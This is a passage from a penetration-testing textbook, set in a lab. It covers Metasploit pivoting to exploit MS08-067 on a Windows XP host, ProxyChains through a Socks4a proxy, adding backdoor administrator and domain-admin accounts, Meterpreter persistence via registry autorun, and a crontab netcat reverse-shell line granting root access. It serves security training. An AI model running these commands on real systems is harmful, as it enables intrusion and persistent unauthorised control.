### Listing 13-29: Port Scanning with Metasploit

Set the `RHOSTS` option as usual for auxiliary modules. By default, Metasploit scans ports 1-10000, though you can change this range if needed. While Metasploit’s port scanners are not as powerful as Nmap’s, they can still be useful. For example, we can determine that the SMB port is open. From there, we might run the `auxiliary/scanner/smb/smb_version` module followed by the `check` function with the `windows/smb/ms08_067_netapi` module to identify and exploit the Windows XP target using the MS08-067 vulnerability through a pivot.

### Running an Exploit through a Pivot

Since our Windows XP and Kali systems are on different networks, a reverse payload won't work because the Windows XP target won’t know how to route traffic back to 192.168.20.9. (If our Kali system was on the Internet and the internal network could route to the Internet, this would not be an issue. However, in this case, our host-only network does not know how to route to our bridged network.) Instead, we will use a bind payload. Metasploit’s bind handler can route through the pivot we set up. The `windows/meterpreter/bind_tcp` payload will work as shown in Listing 13-30.

```plaintext
msf exploit(handler) > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 172.16.85.190
RHOST => 172.16.85.190
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(ms08_067_netapi) > exploit
```

**Listing 13-30: Exploiting through a pivot**

We have now established another session, this time through a pivot.

### Socks4a and ProxyChains

Pivoting through Metasploit is effective, but it limits us to using only Metasploit modules. To proxy other tools through Metasploit’s pivot, we can use the ProxyChains tool, which redirects traffic to proxy servers. First, we need to set up a proxy server in Metasploit. Metasploit includes a Socks4a proxy server module (`auxiliary/server/socks4a`). Listing 13-31 shows how to set up the proxy server.

```plaintext
msf > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
Module options (auxiliary/server/socks4a):
Name           Current Setting  Required  Description
----           ---------------  --------  -----------
SRVHOST        0.0.0.0          yes       The address to listen on
SRVPORT        1080             yes       The port to listen on.
msf auxiliary(socks4a) > exploit
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
```

**Listing 13-31: Setting up a Socks4a proxy server in Metasploit**

Leave the options at their defaults, noting that the server will be listening on port 1080.

Next, edit the configuration file for ProxyChains at `/etc/proxychains.conf`. Scroll down to the bottom of the file in an editor, and you should see that by default, ProxyChains is set to route traffic to the Tor network.

```plaintext
# add proxy here ...
# defaults set to “tor”
socks4 127.0.0.1 9050
```

Change the proxy value to Metasploit’s listening server. Replace port 9050 (for Tor) with 1080 (for Metasploit). The line should now read:

```plaintext
socks4 127.0.0.1 1080
```

Save the configuration file for ProxyChains. Now we can run tools like Nmap from outside Metasploit against our Windows XP target, as long as we preface them with `proxychains`, as shown in Listing 13-32. (The Metasploit route must still be active because ProxyChains simply redirects the traffic to Metasploit, which will forward the traffic through the pivot.)

```plaintext
root@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OKu
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190:446-<><>-OKu
```

**Listing 13-32: Using ProxyChains to route Nmap traffic through Metasploit**

### Post-Exploitation: Adding Users and Groups

After gaining access, we may want to add new users and groups. For example, on a Windows XP target, we can add a user and assign it to the Administrators group.

```plaintext
C:\Documents and Settings\georgia\Desktop> net user james password /add
The command completed successfully.

C:\Documents and Settings\georgia\Desktop> net localgroup Administrators james /add
The command completed successfully.
```

If your client has a Windows domain, you can add users to the domain and domain groups (if you have sufficient privileges) by adding `/domain` to the end of the command. For instance, if you can steal a domain administrator’s token, you can use the following commands to add a domain administrator account, giving you full control of the entire domain.

```plaintext
C:\Documents and Settings\georgia\Desktop> net user georgia2 password /add /domain
C:\Documents and Settings\georgia\Desktop> net group "Domain Admins" georgia2 /add /domain
```

On a Linux target, you can use `adduser` to add a user account. Ideally, you should also add the new user to the `sudoers` group to gain root privileges.

### Metasploit Persistence

The Meterpreter script `persistence` automates the creation of a Windows backdoor that will automatically connect back to a Metasploit listener at startup, login, and so on, based on the options used when creating it. The options for the persistence script are shown in Listing 13-33.

```plaintext
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
-A   Automatically start a matching multi/handler to connect to the agent
-L   Location in target host where to write payload to, if none %TEMP% will be used.
-P   Payload to use, default is windows/meterpreter/reverse_tcp.
-S   Automatically start the agent on boot as a service (with SYSTEM privileges)
-T   Alternate executable template to use
-U   Automatically start the agent when the User logs on
-X   Automatically start the agent when the system boots
-h   This help menu
-i   The interval in seconds between each connection attempt
-p   The port on the remote host where Metasploit is listening
-r   The IP of the system running Metasploit listening for the connect back
```

**Listing 13-33: Meterpreter persistence script**

As you can see, we have many customization options for our persistent payload. We can have the persistence agent start at boot or when the user logs in. We can set an interval between attempts to connect to the handler. We can change where the agent is written on the target system. We can also specify the remote host and port for the agent to connect back to. We can even have Metasploit automatically set up a handler to catch the incoming connection. In the process of setting up persistence, Metasploit writes the persistence agent to the disk, so Meterpreter is no longer completely residing in memory at this point.

When the persistence agent runs at startup (`-X`), a Visual Basic script is uploaded to the `%TEMP%` folder, and a registry entry is added to the list of programs to run at startup. When the persistence agent runs upon login (`-U`), the process is similar, but the registry entry is set to run at login. When the persistence agent runs as a service (`-S`), a Windows system service is created that will call the Visual Basic script from `%TEMP%`.

Let’s run the persistence script, as shown in Listing 13-34, telling the agent to connect back to our Kali machine when the user logs in.

```plaintext
meterpreter > run persistence -r 192.168.20.9 -p 2345 -U
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/BOOKXP_20150814.1154.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345
[*] Persistent agent script is 614853 bytes long
[+] Persistent Script written to C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
[*] Executing script C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
[+] Agent executed with PID 840
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
```

**Listing 13-34: Running the persistence script**

After running the script, place the Meterpreter session in the background with the `background` command, and set up a handler to catch the persistence agent. Restart the Windows XP target and log in as `georgia`. You should receive another Meterpreter session.

**Note:** If it doesn’t work the first time, try restarting and logging in again.

### Creating a Linux cron Job

On both Windows and Linux systems, we can automatically start tasks at a given time. For example, we can set up a cron job to automatically run a Metasploit payload or even just use Netcat to connect back to us.

Open `/etc/crontab` on your Linux target. The following line will run the command `nc 192.168.20.9 12345 -e /bin/bash` every ten minutes of every hour of every day of every month—basically every ten minutes. The command will be run as root. Add this line to the end of the `/etc/crontab` file.

```plaintext
*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash
```

Restart the cron service by entering `service cron restart`. Set up a Netcat listener on port 12345 on your Kali machine, and at the next ten-minute mark, the cron job should run, and you should receive a root shell at your Netcat listener.

### Summary

In this chapter, we covered several post-exploitation techniques, including methods for escalating privileges, gathering local information, pivoting from one network to another, and making our access permanent. We explored using Metasploit for port scanning, exploiting through a pivot, setting up a Socks4a proxy server, and creating persistent backdoors. Additionally, we discussed adding users and groups, and setting up cron jobs for automated tasks.

### Chapter 14: Web Application Testing

While automated scanners are great at finding known vulnerabilities in web applications, many clients build custom web applications. Commercial products can automate attacks against user input fields in custom web applications, but nothing can replace a skilled penetration tester with a proxy for finding security issues in these applications.

Like all software, web applications may have issues when input is not properly sanitized. For example, when an application pulls data from a database based on certain user input, the application may expect specific input such as a username and password. If, instead, the user enters special input to create additional database queries, they may be able to steal data from the database, bypass authentication, or even execute commands on the underlying system.

In this chapter, we will look at finding some common vulnerabilities in web applications using the example web application installed on the Windows 7 target: a simple bookstore with several security issues frequently found in web applications. (See “Installing Additional Software” on page 52 for installation instructions.)

### Using Burp Proxy

We can use a proxy to capture requests and responses between our browser and the web application so we can see exactly what data is being transmitted. Kali Linux comes with the free version of Burp Suite, a testing platform for web applications that includes a proxy feature. Burp includes other useful components, such as Burp Spider, which can crawl through web application content and functionality, and Burp Repeater, which allows you to manipulate and resend requests to the server. For now, we’ll focus on the Burp Proxy tab.

To start Burp Suite in Kali Linux, go to Applications at the top left of the Kali GUI, and then click Kali Linux → Web Applications → Web Application Fuzzers → burpsuite, as shown in Figure 14-1.

**Figure 14-1: Starting Burp Suite in Kali**

Click the Proxy tab, as shown in Figure 14-2. By default, the Intercept is on button should be selected so that Burp Suite intercepts and traps any outgoing requests from a web browser configured to use Burp as a proxy for web traffic. This setting will allow us to see and even modify the details of web requests before they are sent to the server.

**Figure 14-2: Burp Proxy interface**

Now we need to tell our browser in Kali Linux to proxy web traffic through Burp Suite.

1. Open the Iceweasel browser, go to Edit → Preferences → Advanced, and select the Network tab.
2. Click Settings to the right of Connection.
3. In the Connection Settings dialog, shown in Figure 14-3, select Manual proxy configuration, and enter the IP address 127.0.0.1 and port 8080. This tells Iceweasel to proxy traffic through the localhost on port 8080, the default port for Burp Proxy.

**Figure 14-3: Setting a proxy in Iceweasel**

To ensure that Iceweasel will proxy all our traffic through Burp Suite, browse to the URL `bookservice` on your Windows 7 target: `http://192.168.20.12/bookservice`.

The connection should appear to hang in the browser, and the browser and Burp Suite should light up as the HTTP GET request for the main page of the `bookservice` site is captured by Burp Proxy, as shown in Figure 14-4.

**Figure 14-4: Captured HTTP GET request**

We can see the details of the HTTP GET request asking the server for the `bookservice` web page. As we will see later, we can make changes to the request before sending it to the server.